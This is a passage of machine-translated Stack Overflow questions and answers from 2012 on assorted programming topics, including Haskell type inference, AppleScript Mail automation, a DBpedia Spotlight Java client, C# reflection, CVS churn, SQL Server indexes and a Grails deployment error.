嗯，正如消息所说，

```
start 2 [0,0,0] 
```

可以具有*任何*类型，它是 的实例`Test`。编译器无法在没有你告诉它的情况下找到它，或者直接使用类型签名，

```
> start 2 [0,0,0] :: Config 
```

应该可以毫无问题地工作，或者通过提供可以推断类型的上下文，

```
> indent $ start 2 [0,0,0] 
```

也应该可以工作，因为现在可以通过`indent`使用`start`.

您可能希望编译器选择类型`Config`，因为目前，这是`Test`. 但是编译器从不选择一个实例，因为它不知道其他实例，因为当其他实例添加到不同的模块中时，这可能会破坏代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T19:38:10.743

问题是，在构造时，表达式`start 2 [0,0,0,0]`可以返回属于 class的*任何*`Test`类型。在那种情况下，您希望它返回一个`Config`. 如果你明确地投射它，即

```
start 2 [0,0,0] :: Config 
```

那应该行得通。

# applescript - 使用 AppleScript 将 .rtf 文本复制到电子邮件正文中

> ID：10658483
> 
> 赞同：2
> 
> 时间：2012-05-18T19:14:13.403
> 
> 标签：applescript, rtf

我有一个 AppleScript 应用程序，它创建一封电子邮件（在 Mail.app 中），其中包含我通过对话框选择的选项的附件。文本模板以`.rtf`格式存储，因此非程序员可以根据自己的意愿更改文本模板。

我可以从`.txt`纯文本文件创建电子邮件，但是当我导入`.rtf`文本文件时，它会导入格式命令，这是我不希望在邮件中出现的。

以下是`.rtf`导入电子邮件的示例：

> {\rtf1\ansi\ansicpg1252\cocoartf1038\cocoasubrtf360 {\fonttbl\f0\fswiss\fcharset0 Helvetica-Light;} {\colortbl;\red255\green255\blue255;} \pard\tx560\tx1120\tx1680\tx2240\tx2800\ tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\ql\qnatural\pardirnatural
> 
> \f0\fs24 \cf0 面向英语使用者的技术邮件\

这是我的脚本的一部分：

```
-- Import the .rtf file and store content in the mycontent variable    
set mycontent to (read "/Users/kiara/Desktop/mailer/technology/tech-en-content.rtf")
…
…
-- create mail from values stored in variables
tell application "Mail"
    set theMessage to make new outgoing message with properties {visible:true, subject:mysubject, content:mycontent}
    tell content of theMessage
        make new attachment with properties {file name:this_file} at after last paragraph
    end tell
end tell 
```

是否可以在没有格式代码的情况下将文件中的格式化文本导入`.rtf`新邮件（我选择 rtf 是因为大多数粗体和颜色用于格式化文本）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T23:58:58.817

这是另一种方法：

```
set the clipboard to (read "/Users/kiara/Desktop/mailer/technology/tech-en-content.rtf" as «class RTF »)

tell application "Mail"
    activate
    set theMessage to make new outgoing message with properties {visible:true, subject:"mysubject"}
end tell

tell application "System Events"
    tell process "Mail"
        repeat until focused of UI element 1 of scroll area 4 of window 1
            keystroke tab
        end repeat
        keystroke "v" using command down
    end tell
end tell 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T22:33:19.607

我认为 Mail 以纯文本或 html 格式发送电子邮件，而不是 rtf。因此，您需要将电子邮件作为 html 而不是 rtf 发送。请注意，通过 applescript 使用 Mail 发送 html 电子邮件有一个技巧。由于某种原因，您不能将新消息的可见属性设置为 true。如果你这样做是行不通的。

这是如何帮助您的。您可以使用命令行工具 textutil 将 rtf 转换为 html，然后将其作为电子邮件发送。请注意，我在命令中使用“tidy”来确保 html 代码是干净的。

因此，您需要做的就是将收件人的电子邮件地址和主题放入此脚本并运行它...

```
set emailAddress to "someone@somewhere.com"
set theSubject to "My converted rtf to html"

set rtfFile to choose file with prompt "Choose the RTF file to email as HTML:" without invisibles
set theHTML to do shell script "/usr/bin/textutil " & " -stdout -format rtf -convert html " & quoted form of POSIX path of rtfFile & " | /usr/bin/tidy -b -utf8"

tell application "Mail"
    set newMessage to make new outgoing message at end of outgoing messages with properties {visible:false}
    tell newMessage
        make new to recipient at end of to recipients with properties {address:emailAddress}
        set subject to theSubject
        set html content to theHTML
        send
    end tell
end tell 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-12-01T17:04:03.213

adayzdone 答案对我有用 - 或多或少。在 Mac os X 10.15.6 、 Mail 13.4 下，滚动区域位于另一个位置/索引处。而不是使用`keystroke tab`来获取内容区域，另一种方法是

```
set value of attribute "AXFocused" of UI element of scroll area 1 of window 1 to true 
```

如果您需要查找滚动区域或识别其他 UI 元素 - 您可能想要使用

```
on FindScrollAreas()
    set Indices to {}
    set the clipboard to "hello World"
    tell application "System Events"
        tell process "Mail"
            activate
            set i to 1
            repeat with UIElement in UI elements of front window
                -- button, text field, scroll area, static text
                if class of UIElement is scroll area then
                    set end of Indices to i
                end if
                set i to i + 1
            end repeat
        end tell
    end tell
    return Indices
end FindScrollAreas 
```

并且还有使用 Automator 的绝妙方法**观看我**获取菜单项： [请参阅这篇文章](https://apple.stackexchange.com/questions/315086/applescript-ui-scripting-and-click)
（您必须将事件从 Automator 复制粘贴到某个文本编辑器才能获得一些相应的 AppleScript）

并且有 Xcode -> Xcode(menu) -> Open Developer Tool -> Accessibility Inspector - 但我发现很难将信息传输到 applescript

希望有帮助，最好的汤姆

# java - 在 java 或 scala 中使用 dbpedia 聚光灯

> ID：10658485
> 
> 赞同：7
> 
> 时间：2012-05-18T19:14:37.907
> 
> 标签：java, scala, dbpedia

有谁知道在哪里可以找到一点*如何*在 java 或 scala 中使用 dbpedia 聚光灯？或者任何人都可以解释它是如何完成的？我找不到这方面的任何信息...

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-27T09:53:12.280

你需要下载 dbpedia Spotlight（jar 文件），然后你可以使用接下来的两个类（作者 pablomendes）我只做一些改变。

```
public class db extends AnnotationClient {

    //private final static String API_URL = "http://jodaiber.dyndns.org:2222/";
    private static String  API_URL    = "http://spotlight.dbpedia.org:80/";
    private static  double  CONFIDENCE = 0.0;
    private static  int     SUPPORT    = 0;
    private static  String  powered_by ="non";
    private static  String  spotter ="CoOccurrenceBasedSelector";//"LingPipeSpotter"=Annotate all spots 
                                                //AtLeastOneNounSelector"=No verbs and adjs.    
                                                //"CoOccurrenceBasedSelector" =No 'common words'
                                                //"NESpotter"=Only Per.,Org.,Loc.
    private static String  disambiguator ="Default";//Default ;Occurrences=Occurrence-centric;Document=Document-centric
    private static String  showScores ="yes";

@SuppressWarnings("static-access")
public void configiration(double CONFIDENCE,int SUPPORT,
                          String powered_by,String spotter,String disambiguator,String showScores){
    this.CONFIDENCE=CONFIDENCE;
    this.SUPPORT=SUPPORT;
    this.powered_by=powered_by;
    this.spotter=spotter;
    this.disambiguator=disambiguator;
    this.showScores=showScores;

}
    public List<DBpediaResource> extract(Text text) throws AnnotationException {
        LOG.info("Querying API.");
        String spotlightResponse;
        try {
            String Query=API_URL + "rest/annotate/?" +
                    "confidence=" + CONFIDENCE
                  + "&support=" + SUPPORT
                  + "&spotter=" + spotter
                  + "&disambiguator=" + disambiguator
                  + "&showScores=" + showScores
                  + "&powered_by=" + powered_by
                  + "&text=" + URLEncoder.encode(text.text(), "utf-8");
            LOG.info(Query);

            GetMethod getMethod = new GetMethod(Query);
            getMethod.addRequestHeader(new Header("Accept", "application/json"));
            spotlightResponse = request(getMethod);

        } catch (UnsupportedEncodingException e) {
            throw new AnnotationException("Could not encode text.", e);
        }
        assert     spotlightResponse != null;
        JSONObject resultJSON         = null;
        JSONArray  entities           = null;

        try {                   
            resultJSON = new JSONObject(spotlightResponse);
            entities = resultJSON.getJSONArray("Resources");

        } catch (JSONException e) {
            //throw new AnnotationException("Received invalid response from DBpedia Spotlight API.");
        }

        LinkedList<DBpediaResource> resources = new LinkedList<DBpediaResource>();
        if(entities!=null) 
        for(int i = 0; i < entities.length(); i++) {
            try {
                JSONObject entity = entities.getJSONObject(i);
                resources.add(
                        new DBpediaResource(entity.getString("@URI"),
                        Integer.parseInt(entity.getString("@support"))));
            } catch (JSONException e) {
                LOG.error("JSON exception "+e);
            }
        }
        return resources;
    }

} 
```

二等

```
/**
 * @author pablomendes
 */
public abstract class AnnotationClient {

    public Logger LOG = Logger.getLogger(this.getClass());
    private List<String> RES = new ArrayList<String>();

    // Create an instance of HttpClient.
    private static HttpClient client = new HttpClient();
    public List<String> getResu(){
        return RES;     
    }

    public String request(HttpMethod method) throws AnnotationException {
        String response = null;
        // Provide custom retry handler is necessary
        method.getParams().setParameter(HttpMethodParams.RETRY_HANDLER,
                new DefaultHttpMethodRetryHandler(3, false));
        try {
            // Execute the method.
            int statusCode = client.executeMethod(method);
            if (statusCode != HttpStatus.SC_OK) {
                LOG.error("Method failed: " + method.getStatusLine());
            }

            // Read the response body.
            byte[] responseBody = method.getResponseBody(); //TODO Going to buffer response body of large or unknown size. Using getResponseBodyAsStream instead is recommended.

            // Deal with the response.
            // Use caution: ensure correct character encoding and is not binary data
            response = new String(responseBody);

        } catch (HttpException e) {
            LOG.error("Fatal protocol violation: " + e.getMessage());
            throw new AnnotationException("Protocol error executing HTTP request.",e);
        } catch (IOException e) {
            LOG.error("Fatal transport error: " + e.getMessage());
            LOG.error(method.getQueryString());
            throw new AnnotationException("Transport error executing HTTP request.",e);
        } finally {
            // Release the connection.
            method.releaseConnection();
        }
        return response;

    }

    protected static String readFileAsString(String filePath) throws java.io.IOException{
        return readFileAsString(new File(filePath));
    }

    protected static String readFileAsString(File file) throws IOException {
        byte[] buffer = new byte[(int) file.length()];
        @SuppressWarnings("resource")
        BufferedInputStream f = new BufferedInputStream(new FileInputStream(file));
        f.read(buffer);
        return new String(buffer);
    }

    static abstract class LineParser {

        public abstract String parse(String s) throws ParseException;

        static class ManualDatasetLineParser extends LineParser {
            public String parse(String s) throws ParseException {
                return s.trim();
            }
        }

        static class OccTSVLineParser extends LineParser {
            public String parse(String s) throws ParseException {
                String result = s;
                try {
                    result = s.trim().split("\t")[3];
                } catch (ArrayIndexOutOfBoundsException e) {
                    throw new ParseException(e.getMessage(), 3);
                }
                return result; 
            }
        }
    }

    public void saveExtractedEntitiesSet(String Question, LineParser parser, int restartFrom) throws Exception {
        String text = Question;
        int i=0;
        //int correct =0 ; int error = 0;int sum = 0;

        for (String snippet: text.split("\n")) {
            String s = parser.parse(snippet);
            if (s!= null && !s.equals("")) {
                i++;

                if (i<restartFrom) continue;

                List<DBpediaResource> entities = new ArrayList<DBpediaResource>();

                try {
                    entities = extract(new Text(snippet.replaceAll("\\s+"," ")));
                    System.out.println(entities.get(0).getFullUri());

                } catch (AnnotationException e) {
                   // error++;
                    LOG.error(e);
                    e.printStackTrace();
                }
                for (DBpediaResource e: entities) {
                    RES.add(e.uri());
                }
            }
        }
    }

    public abstract List<DBpediaResource> extract(Text text) throws AnnotationException;

    public void evaluate(String Question) throws Exception {
        evaluateManual(Question,0);
    }

    public void evaluateManual(String Question, int restartFrom) throws Exception {
         saveExtractedEntitiesSet(Question,new LineParser.ManualDatasetLineParser(), restartFrom);
    }
} 
```

主要的（）

```
public static void main(String[] args) throws Exception {

    String Question ="Is the Amazon river longer than the Nile River?";

    db c = new db ();  
        c.configiration(0.0, 0, "non", "CoOccurrenceBasedSelector", "Default", "yes");  
    System.out.println("resource : "+c.getResu());
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-21T19:03:42.487

DBpedia Spotlight [wiki](https://github.com/dbpedia-spotlight/dbpedia-spotlight/wiki)页面将是一个很好的起点。

而且我相信[安装](https://github.com/dbpedia-spotlight/dbpedia-spotlight/wiki/Installation)页面列出了使用该应用程序的最流行的方式（使用 jar 或设置 Web 服务）。

它包括有关在您自己的安装中[使用 Java/Scala API或调用 Web 服务的说明。](https://github.com/dbpedia-spotlight/dbpedia-spotlight/wiki/Run-from-Java-or-Scala)

需要下载一些额外的数据来运行您自己的服务器以获得全面服务，这是为自己煮咖啡的好时机。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-12-15T15:30:20.653

我只是为您的答案添加了一个小修复。如果您添加`evaluate`方法调用，您的代码正在运行：

```
public static void main(String[] args) throws Exception {
    String question = "Is the Amazon river longer than the Nile River?";
    db c = new db ();
    c.configiration(0.0, 0, "non", "CoOccurrenceBasedSelector", "Default", "yes");
    c.evaluate(question);
    System.out.println("resource : "+c.getResu());
} 
```

胺

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-03-02T09:33:26.353

在[阿德尔的回答](https://stackoverflow.com/a/15655919/3972890)`request`中的第二类（`AnnotationClient`）的方法中，作者巴勃罗·门德斯还没说完

```
TODO Going to buffer response body of large or unknown size. Using getResponseBodyAsStream instead is recommended. 
```

这是一个烦人的警告，需要通过替换来删除

```
byte[] responseBody = method.getResponseBody(); //TODO Going to buffer response body of large or unknown size. Using getResponseBodyAsStream instead is recommended.

// Deal with the response.
// Use caution: ensure correct character encoding and is not binary data
response = new String(responseBody); 
```

和

```
Reader in = new InputStreamReader(method.getResponseBodyAsStream(), "UTF-8");
StringWriter writer = new StringWriter();
org.apache.commons.io.IOUtils.copy(in, writer);
response = writer.toString(); 
```

# notepad++ - 记事本++ zen 编码“带缩写包装”

> ID：10658487
> 
> 赞同：0
> 
> 时间：2012-05-18T19:14:58.103
> 
> 标签：notepad++, emmet

当我尝试`wrap with abreviation`一个单词时，我正在使用 NP++ 和 zen 编码，

这是我正在寻找的结果：

```
Zynga shares opened <i>slightly<i/> higher Friday 
```

但相反，我得到了这个：

```
Zynga shares opened <slightly></slightly> higher Friday 
```

我按照此处的说明进行操作：[http](http://code.google.com/p/zen-coding/wiki/Actions#Wrap_with_Abbreviation) ://code.google.com/p/zen-coding/wiki/Actions#Wrap_with_Abbreviation 关于为什么记事本++ 的行为如此以及如何解决此问题的任何建议？
谢谢你

`ctrl+enter`re：在缩写窗口中修复它。这`ctrl+e`与执行 zen 代码的标准方式不同

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-09T10:32:14.180

只需按`ctrl+alt+shift+enter`然后键入`i`。

# c# - 我可以有ac#字典吗 在 foreach 循环中使用这些类型？

> ID：10658492
> 
> 赞同：0
> 
> 时间：2012-05-18T19:15:10.600
> 
> 标签：c#, function, generics, lambda

我想做类似的事情

```
public class someClass{

    public void somemethod<T>(){ 
        //dosomething with T;
    }

     public void someothermethod<U>(){ 
        //dosomething with U;
    }
} 
```

同时在另一个班级

```
IDictionary<Type,Type> dic = new Dictionary<Type, Type>();
dic.add(ClassA, InterfaceA);
dic.add(ClassB, InterfaceB);
dic.add(ClassC, InterfaceC);
dic.add(ClassD, InterfaceD);

dic.foreach(kvp => somemethod<kvp.key>().someothermethod<kvp.value>()); 
```

这似乎不起作用。在尖括号内，Visual Studio 告诉我它无法解析 kvp？我究竟做错了什么？任何帮助或示例总是受到赞赏。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-18T19:27:01.143

这根本不是关于字典的——它是关于在执行时只知道类型时调用泛型方法。

您可以通过反射来做到这一点，使用`MethodInfo.MakeGenericMethod`，然后调用结果：

```
using System;
using System.Reflection;

class Test
{
    static void Main()
    {
        InvokeGenericMethod(typeof(string));
        InvokeGenericMethod(typeof(int));
    }

    static void InvokeGenericMethod(Type type)
    {
        var method = typeof(Test).GetMethod("GenericMethod");
        var generic = method.MakeGenericMethod(type);
        generic.Invoke(null, null);
    }

    public static void GenericMethod<T>()
    {
        Console.WriteLine("typeof(T) = {0}", typeof(T));
    }    
} 
```

# file - CVS 中的文件流失

> ID：10658495
> 
> 赞同：0
> 
> 时间：2012-05-18T19:15:18.197
> 
> 标签：file, cvs

我正在寻找每个文件在我们的 cvs 存储库中的特定分支上更改的次数。我特别在寻找所有变化最大的文件。“前 40 名”名单就足够了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-07-08T13:48:52.330

[这是原始提问者作为编辑添加的，我已将其转换为社区 wiki 答案，因为它应该是答案，而不是编辑。]

在这种情况下，该分支已经使用了大约 6 个月。如果我设置为该分支中的最新版本（“cvs -z9 co -r r80m-1 ...”），则修订的最后一个数字似乎是当前分支中的更改数量——如果文件有在过去 180 天内被更改，那么它就在这个分支上。我正在使用linux，所以我最终这样做了：

```
for file in `find . \! \( -name CVS -prune \) -type f -mtime -180`
do
   cvs status "$file" | grep Working.revision | gawk -v FNAME=$file '{ print FNAME gensub(/(\.)([0-9]*)$/, "\\1\\2 churn:\\2  ", 1) }' >> cvs_churn.txt
done
sort -k3 -t: -n cvs_churn.txt | uniq 
```

因此，对于“cvs status”输出中的每一行，例如：

```
Working revision: 1.2.34 
```

gawk 命令将其更改为：

```
./path/file.c Working revision: 1.2.34        churn:34 
```

然后我可以对“：34”进行排序。

* * *

这行得通，但它很粗糙。我希望其他人可以用更好的方法来回答。

我在其他一些问题中看到过，例如：人们提到了 statCVS 的[免费 CVS 报告工具。](https://stackoverflow.com/questions/3804941)听起来很有趣（超出了我的需要，但其他一些信息也可能有用）。但是，它说它只适用于“默认”分支。文档有点不清楚——我可以设置感兴趣的分支，并为此使用它吗？

# javascript - 如果通过 Selenium 的 executeAsyncScript 执行，如何从 JavaScript 的回调中抛出异常

> ID：10658498
> 
> 赞同：3
> 
> 时间：2012-05-18T19:15:47.937
> 
> 标签：javascript, asynchronous, selenium, selenium-webdriver

我正在使用 Selenium WebDriver 来自动化一些脚本。大多数功能是使用 JavaScript 端点执行的，我无法将此逻辑移至 Python：

```
// Python Selenium script 
data = self.driver.execute_async_script('selenium.get_data(arguments)')

// JavaScript placed somewhere on the page tested
selenium.get_data = function(args) {
    $.ajax({ 
        url:'http://servername/ajax_data', 
        success: function(data) {
            args[0](data);
        },
        error: function(data) {
            // here I would like to notify selenium that everything is broken
        }
    });
}; 
```

在 JavaScript 中通常有一些地方我知道一切都已经坏了，我想在 Selenium 脚本中引发异常。当然我可以等待超时，但我的脚本超时时间很长，我无法在错误消息中提供额外的调试信息。

我已经检查了文档（[http://selenium.googlecode.com/svn/trunk/docs/api/java/org/openqa/selenium/JavascriptExecutor.html](http://selenium.googlecode.com/svn/trunk/docs/api/java/org/openqa/selenium/JavascriptExecutor.html)）和测试的源代码（[http://code.google .com/p/selenium/source/browse/trunk/java/client/test/org/openqa/selenium/ExecutingAsyncJavascriptTest.java?r=15810](http://code.google.com/p/selenium/source/browse/trunk/java/client/test/org/openqa/selenium/ExecutingAsyncJavascriptTest.java?r=15810)）。

现在我正在使用解决方法，这似乎不太好：

```
 error: function(data) {
            window.alert(JSON.stringify(data));
        } 
```

你知道更好的解决方案吗？

# sql-server - 主键总是在 sql server 中被索引？

> ID：10658500
> 
> 赞同：7
> 
> 时间：2012-05-18T19:15:51.520
> 
> 标签：sql-server, indexing, primary-key, clustered-index, non-clustered-index

> 如果指定了非聚集主键约束，则可以在主键列以外的列上创建聚集索引。 [http://msdn.microsoft.com/en-us/library/ms186342.aspx](http://msdn.microsoft.com/en-us/library/ms186342.aspx)

所以上面告诉我：我可以在主键以外的列上创建聚集索引。

我认为它还传达了主键应该是非聚集主键或聚集键。是否可能没有索引主键？

更重要的是：

> 创建 UNIQUE 约束时，默认情况下会创建唯一的非聚集索引以强制执行 UNIQUE 约束。如果表上的聚集索引尚不存在，您可以指定唯一聚集索引。

这是否意味着唯一约束必须创建聚集索引或非聚集索引？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-05-18T19:18:04.363

> 是否可能没有索引主键？

不，这不对。

需要某种索引来监管`PRIMARY KEY`，否则需要在每次插入时扫描整个表（以确保唯一性）。

从[文档](http://msdn.microsoft.com/en-us/library/ms181043%28v=sql.105%29.aspx)：

> 数据库引擎自动创建唯一索引以强制`PRIMARY KEY`约束的唯一性要求。如果表上不存在聚集索引或未显式指定非聚集索引，则会创建唯一的聚集索引以强制执行`PRIMARY KEY`约束。

* * *

> 这是否意味着唯一约束必须创建聚集索引或非聚集索引？

是的，出于同样的原因。

* * *

`PRIMARY KEY`并且`UNIQUE`是逻辑概念，而索引只是具有有效实施它们的副作用。所以，严格来说，`ALTER TABLE ADD CONSTRAINT UNIQUE`和`CREATE UNIQUE INDEX`意思不同。

如果将来某个聪明人发明了一种方法来使用泡利原理或量子纠缠或其他任何方法在物理级别上强制唯一性，`SQL Server 2155`则可能会使用它来强制执行约束，但它仍然必须为索引创建 B-Tree .

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T19:29:47.183

简短的回答：不，

SQL Server 中的每个表都应该只有一个聚集索引。其他索引（非聚集）使用聚集索引。主键通常是聚集索引。但是与外键不同，主键总是被索引。

```
http://www.sqlfiddle.com/#!6/972f0/1 
```

# grails - 使用 cloudfoundry 插件部署 grails 应用程序失败

> ID：10658503
> 
> 赞同：0
> 
> 时间：2012-05-18T19:15:56.067
> 
> 标签：grails, grails-plugin, cloud-foundry

“grails cf-push”会导致下面列出的错误。有没有办法使用 cloudfoundry 插件“重新开始”。我不希望在 MySQL 数据库和 MongoDB 数据库中丢失我的测试数据。

```
May 18, 2012 6:31:26 PM org.apache.catalina.core.StandardContext start 
```

严重：错误 listenerStart 2012 年 5 月 18 日下午 6:31:26 org.apache.catalina.core.StandardContext start 严重：Context [] 由于先前的错误而启动失败 2012 年 5 月 18 日下午 6:31:26 org.apache.catalina .loader.WebappClassLoader clearThreadLocalMap 严重：Web 应用程序 [] 创建了一个 ThreadLocal，其键类型为 [org.codehaus.groovy.reflection.ClassInfo.ThreadLocalMapHandler]（值 [org.codehaus.groovy.reflection.ClassInfo$ThreadLocalMapHandler@6434d75f]）和 [java.lang.ref.SoftReference] 类型的值（值 [java.lang.ref.SoftReference@4927d15e]），但在 Web 应用程序停止时未能将其删除。这很可能造成内存泄漏。2012-05-18 18:31:26,379 [main] 错误 context.ContextLoader - 上下文初始化失败 org.springframework.beans.factory.BeanCreationException：创建名为 ' 的 bean 时出错 grailsApplication' 在 ServletContext 资源 [/WEB-INF/applicationContext.xml] 中定义：调用 init 方法失败；嵌套异常是 org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1455) 的 java.lang.NoClassDefFoundError: org/apache/http/conn/ClientConnectionManager 在 org.springframework.beans.factory.support。 AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:519) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:456) at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java :294) 在 org.springframework.beans.factory.support.DefaultSingletonBeanRegistry。

StandardContext start 严重：Context [] 由于先前的错误而启动失败 2012 年 5 月 18 日下午 6:41:02 org.apache.catalina.loader.WebappClassLoader clearThreadLocalMap 严重：Web 应用程序 [] 创建了一个 ThreadLocal，其键类型为 [org. codehaus.groovy.reflection.ClassInfo.ThreadLocalMapHandler]（值 org.codehaus.groovy.reflection.ClassInfo$ThreadLocalMapHandler@6d1576d7]）和类型为 [java.lang.ref.SoftReference] 的值（值 [java.lang.ref. SoftReference@1c2d5534]) 但在 Web 应用程序停止时未能将其删除。这很可能造成内存泄漏。ThreadLocalMapHandler]（值 org.codehaus.groovy.reflection.ClassInfo$ThreadLocalMapHandler@6d1576d7]）和类型为 [java.lang.ref.SoftReference] 的值（值 [java.lang.ref.SoftReference@1c2d5534]）但未能当 Web 应用程序停止时将其删除。这很可能造成内存泄漏。ThreadLocalMapHandler]（值 org.codehaus.groovy.reflection.ClassInfo$ThreadLocalMapHandler@6d1576d7]）和类型为 [java.lang.ref.SoftReference] 的值（值 [java.lang.ref.SoftReference@1c2d5534]）但未能当 Web 应用程序停止时将其删除。这很可能造成内存泄漏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T19:34:53.047

如果您执行 cf-update 或删除应用程序并重新运行 cf-push，它会询问您是否要使用现有的 MySQL 和 Mongo 服务。如果这样做没有任何数据丢失 - 只是在重新运行 cf-push 之前不要将服务与应用程序一起删除。

确保您使用的是“grails prod cf-push”，因为这将使用生产配置 - 如果您运行“grails cf-push”，则会显示警告。

根本原因是来自 HttpClient 库的 CNFE。看看你是否可以让它在本地工作，它应该在 Cloud Foundry 上正常工作，因为你只是在推送一个战争文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T16:51:35.877

我发现了问题。我添加了一个使用第三方包中的外部 jar 的服务。第三方包附带 2 个 jars：一个有依赖项，一个没有依赖项。我将第 3 方 zip 解压缩到我的类路径中，但在我的 lib 目录中只包含了一个没有依赖项的压缩包。当我切换到使用带有依赖项的 jar 时，应用程序已部署。

以下事情使这个简单的问题难以解决：

1.  错误日志只是说明“grailsApplication”存在问题并且找不到类
2.  该应用程序使用 run-app 在我的工作站上运行，
3.  该应用程序无法使用 run-war 在我的工作站上运行（无论是否提供了正确的 jar），
4.  缺乏睡眠！

进入下一期！

# git - 我怎样才能同时推送到两个回购

> ID：10658510
> 
> 赞同：0
> 
> 时间：2012-05-18T19:16:10.870
> 
> 标签：git

我有我开发代码的开发机器，我托管它的服务器机器和我的中央 git repo 机器。

从我的开发机器上，我怎样才能推送并自动更新中央仓库和服务器机器？

我应该推送到服务器并有一个服务器发布操作来推送到服务器，如果是这样，我该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T19:22:58.317

由于 git 没有内置的“post-push”钩子，一个简单的方法就是将某个分支指定为“生产”分支（通常使用 master 分支），然后创建一个部署脚本（说`git-deploy.sh`）这将从您的服务器上的主分支中提取最新的代码。然后，您可以像这样创建一个 git 别名：

```
git config alias.xpush \!git push origin master && git-deploy.sh 
```

然后您可以使用它运行它

```
git xpush 
```

# jquery-mobile - 通过 div jquery mobile 中的一组加载 flickr 照片

> ID：10658512
> 
> 赞同：0
> 
> 时间：2012-05-18T19:16:18.017
> 
> 标签：jquery-mobile, flickr

我正在创建一个 jquery 移动应用程序；这是在它正在加载的 div 中加载 flickr 照片缩略图的脚本，但它出现在一个组缩略图中而不是加载每个图像。可以通过编辑这个来加载每个缩略图。我刚刚删除了我的 api 密钥和我的身份证。

```
$(function() {
var api_key             = 'API KEY';
var user_id             = 'ID';
var photoset_id         = 'PHOTO SET ID';   

var large_image_size    = 'Medium';

var photoset_id,photo_id;
var current = -1;
var continueNavigation = false;

var photos_service      = 'http://api.flickr.com/services/rest/?&method=flickr.photosets.getPhotos' + '&api_key=' + api_key;
var photos_url          = photos_service + '&photoset_id=' + photoset_id + '&media=photos&format=json&jsoncallback=?';

var large_photo_service = 'http://api.flickr.com/services/rest/?&method=flickr.photos.getSizes' + '&api_key=' + api_key;

var $photosContainer    = $('#images').find('#ba');
var $photopreview       = $('#flickr_photopreview');
var $flickrOverlay      = $('#flickr_overlay');
var $loadingStatus      = $('.loading_small');  

$(function(){
    $('#images').stop().animate(200,function(){
        if($photosContainer.is(':empty')){
            /*
            if sets not loaded, load them
            */
            LoadPhotos();
        }
    });
},function(){

}); 

function LoadPhotos(){
    $photosContainer.empty();
    $loadingStatus.css('visibility','visible');

    $.getJSON(photos_url,function(data){
        if(data.stat != 'fail') {
            var photo_count = data.photoset.photo.length;
            var photo_count_total = photo_count ;

            for(var i = 0; i < photo_count; ++i){   
                var photo           = data.photoset.photo[i];
                var photoid         = photo.id;

                var secret          = photo.secret;
                var server          = photo.server;
                var farm            = photo.farm;

                var photoUrl        = 'http://farm'+farm+'.static.flickr.com/'+server+'/'+photoid+'_'+secret+'_s.jpg';

                var $elem           = $('<div />');
                var $link           = $('<a class="toLoad" href="#" />');

                $link.data({
                    'photoid'       :photoid,
                    'secret'        :secret,
                    'server'        :server,
                    'farm'          :farm,
                    'photoUrl'      :photoUrl,
                    'photo_title'   :photo.title
                });
                $photosContainer.append($elem.append($link));

                $link.bind('click',function(e){
                    var $this   = $(this);
                    current     = $this.parent().index();
                    photo_id    = $this.data('photoid');
                    LoadLargePhoto();
                    e.preventDefault();
                });
            }
            LoadPhotosImages();
        }

    });
}

function LoadPhotosImages(){
    var toLoad          = $('.toLoad:in-viewport').size();
    if(toLoad > 0)
        $loadingStatus.css('visibility','visible');
    var images_loaded   = 0;

    $('.toLoad:in-viewport').each(function(i){
        var $space          = $photosContainer.find('.toLoad:first');
        var $img            = $('<img style="display:none;" />').load(function(){
            ++images_loaded;
            if(images_loaded == toLoad){
                $loadingStatus.css('visibility','hidden');
                $photosContainer.find('img').fadeIn();

            }   
        }).error(function(){
            //TODO
            ++images_loaded;
            if(images_loaded == toLoad){
                $loadingStatus.css('visibility','hidden');
                $photosContainer.find('img').fadeIn();

            }               
        }).attr('src',$space.data('photoUrl'))
          .attr('alt',$space.data('photoid'));

        var $photo_title    = $('<span/>',{'html':$space.data('photo_title')});
        $space.append($photo_title).append($img).removeClass('toLoad');
    });
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-29T16:28:17.197

```
<!DOCTYPE html>
<html lang="en">
<head>
<script src="js/jquery-latest.js"></script>
<script type="text/javascript">

function downloadImg() {
    $.getJSON("http://api.flickr.com/services/feeds/photos_public.gne?jsoncallback=?",
        {
            ids : "78368944@N06",
            tags: "",
            tagmode: "any",
            format: "json",
        },

        function(data) {
            $('.img-1').attr('src', data.items[0].media.m);
            $('.tit-1').text(data.items[0].title);

            $('.img-2').attr('src', data.items[1].media.m);
            $('.tit-2').text(data.items[1].title);
        }
    );
}

$(document).ready(function() {
        downloadImg();
});
</script>
</head>
<body>
<div class="img-cont"><img class="img-1" /> </div>
<h3 class="tit-1"></h3>

<div class="img-cont"><img class="img-1" /> </div>
<h3 class="tit-1"></h3>

</body>
</html> 
```

# android - android在将数据插入数据库之前检查重复值

> ID：10658513
> 
> 赞同：0
> 
> 时间：2012-05-18T19:16:18.743
> 
> 标签：android, database, sqlite

```
 String new_recorded_lastname="a lastname";
    ////record to database......
    Cursor cursor = db.rawQuery("SELECT lastname FROM people; ",null);

     if (cursor != null){
  while(cursor.moveToNext()){

    String recorded_lastname=cursor.getString(cursor.getColumnIndex("lastname"));
